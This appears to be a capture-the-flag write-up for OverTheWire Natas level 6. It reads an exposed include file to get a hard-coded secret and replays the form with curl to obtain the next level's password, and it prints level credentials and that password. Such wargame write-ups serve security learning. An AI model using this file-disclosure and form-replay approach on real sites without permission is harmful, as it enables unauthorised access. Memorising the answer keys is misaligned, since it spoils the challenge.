# NATAS LEVEL 6

```
http://overthewire.org/wargames/natas/natas6.html
```

```
Username: natas6
Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
URL:      http://natas6.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

The page invites us to "view source", so let's!

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We see a small snippet of code that does a check against the submitted input
field with a variable `$secret`. We also see that there is another source file
included `secret.inc`.  Inside that source file we see where our variable
`$secret` is defined..

```
http://natas6.natas.labs.overthewire.org/includes/secret.inc

<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Going back to the main page, we try entering a test value of `test` and observe
that the page submits the following FORM DATA to the server.

```
secret=test&submit=Submit
```

Now let's insert the value for `$secret` we found in the source..

```
#! /bin/bash

$ curl 'http://natas6.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM2OmFHb1k0cTJEYzZNZ0RxNG9MNFl0b0t0eUFnOVBlSGEx' --data 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit'
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
